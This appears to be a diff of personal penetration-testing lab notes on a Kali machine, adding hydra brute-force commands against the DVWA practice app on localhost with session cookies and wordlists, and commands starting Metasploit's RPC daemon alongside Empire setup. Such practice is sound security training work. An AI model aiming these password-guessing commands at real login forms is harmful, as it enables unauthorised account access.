@@ -10,3 +10,16 @@ cd Empire
 
 cd /opt/Empire
 source empire-env/bin/activate 
+
+hydra -L /home/kali/dmpp/config/users.txt -P /home/kali/dmpp/config/users.txt 127.0.0.1 http-get-form '/DVWA/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.H=Cookie:PHPSESSID:"96e74c44254b1afc3b71362e4bc594b1"'
+hydra -l admin -P /home/kali/dmpp/config/passwords.txt 127.0.0.1 http-get-form "/dvwa/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=96e74c44254b1afc3b71362e4bc594b1;security=low:F=Username and/or password incorrect."
+PHPSESSID:"96e74c44254b1afc3b71362e4bc594b1"
+
+hydra -l admin -P /home/kali/dmpp/config/users.txt 127.0.0.1 http-get-form "/DVWA/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:H=Cookie:PHPSESSID=96e74c44254b1afc3b71362e4bc594b1;security=low:F=Username and/or password incorrect."
+
+hydra -l admin -P /home/kali/dmpp/config/users.txt 127.0.0.1 http-post-form "/DVWA/login.php:username=admin&password=^PASS^&Login=Login&user_token=bb26bdd6b7f28671dbda002f7852775b: H-Cookie:security-low; PHPSESSID=3d16cc0a86d372fba0dfb8f1d82f81d6" -v
+
+
+
+msfrpcd -U msf -P workplease -f
+load msgrpc Pass=workplease
